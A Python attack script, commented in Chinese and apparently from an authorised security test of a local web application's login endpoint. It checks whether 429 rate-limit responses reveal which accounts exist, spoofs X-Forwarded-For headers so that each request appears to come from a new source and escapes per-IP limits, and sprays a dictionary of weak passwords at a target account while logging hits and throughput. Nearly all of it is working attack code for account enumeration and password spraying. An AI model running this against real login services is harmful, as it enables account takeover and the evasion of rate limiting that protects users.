#!/usr/bin/env python3
"""18 枚举判定 + 弱口令喷洒：429 状态是否泄露账号存在性；字典命中与吞吐。"""
import json
import os
import statistics
import time

import httpx

DOC = "https://localhost:8603"
XFF = "https://localhost:8604"
SITE = "https://localhost:8603"
EV = "/tmp/sj-attacker/evidence-bf"
os.makedirs(EV, exist_ok=True)
RES = {}


def note(k, v):
    RES[k] = v
    print(f"[{k}] {json.dumps(v, ensure_ascii=False)[:800]}")


def post_login(c, base, user, pw, xff=None):
    h = {"Origin": SITE}
    if xff:
        h["X-Forwarded-For"] = xff
    t0 = time.perf_counter()
    r = c.post(base + "/api/login/", data={"username": user, "password": pw}, headers=h, timeout=20)
    return r.status_code, (time.perf_counter() - t0) * 1000, r.headers.get("retry-after")


def probe_account(c, user, n=12, base=XFF, pw="Wrong-Password-2026"):
    """每个请求换一个伪造来源，排除「来源桶」干扰，只看账号桶是否触发。"""
    seq = []
    for i in range(n):
        st, dt, ra = post_login(c, base, user, pw, xff=f"203.0.113.{100 + i}")
        seq.append({"i": i + 1, "status": st, "retry_after": ra, "ms": round(dt, 1)})
        if st == 429:
            break
    return seq


def main():
    with httpx.Client(verify=False) as c:
        c.get(DOC + "/api/health/")
        seq_exist = probe_account(c, "bf-editor")
        seq_missing = probe_account(c, "ghost-account-xyz")
        note("existing_account_probe", seq_exist)
        note("missing_account_probe", seq_missing)
        note("enumeration_oracle", {
            "existing_blocked_at": next((r["i"] for r in seq_exist if r["status"] == 429), None),
            "missing_blocked_at": next((r["i"] for r in seq_missing if r["status"] == 429), None),
            "distinguishable": (any(r["status"] == 429 for r in seq_exist)
                                and not any(r["status"] == 429 for r in seq_missing)),
        })
        # 证明不是来源桶：同一伪造来源打另一个账号
        st, dt, ra = post_login(c, XFF, "bf-admin", "Bf2026-Adm1n!x1", xff="203.0.113.199")
        note("control_other_account_after_lock", {"status": st, "retry_after": ra})

        # 弱口令喷洒：字典 12 条，真实口令在第 7 位
        dictionary = [
            "password1234", "Password2026", "Sanjiang2026", "Welcome123456",
            "Admin2026!pass", "Qwerty123456!", "Summer2026!x", "Library2026!",
            "Student2026!x", "Njit2026!pass", "Resource2026!", "Sanjiang!2026",
        ]
        spray = []
        t0 = time.perf_counter()
        hit = None
        for idx, pw in enumerate(dictionary[:10], start=1):
            st, dt, ra = post_login(c, DOC, "bf-victim", pw)
            spray.append({"attempt": idx, "password": pw, "status": st,
                          "retry_after": ra, "ms": round(dt, 1)})
            if st == 303:
                hit = idx
                break
        elapsed = time.perf_counter() - t0
        note("spray_run", {"attempts": len(spray), "hit_at": hit,
                           "elapsed_s": round(elapsed, 2),
                           "avg_ms": round(elapsed / max(len(spray), 1) * 1000, 1),
                           "req_per_s": round(len(spray) / max(elapsed, 1e-9), 2),
                           "trail": spray})
        # 命中后配额与锁定状态
        st, dt, ra = post_login(c, DOC, "bf-victim", "Another-Wrong-Pass")
        note("after_success_state", {"status": st, "retry_after": ra})

    with open(EV + "/18-enum-and-spray.json", "w") as f:
        json.dump(RES, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    main()
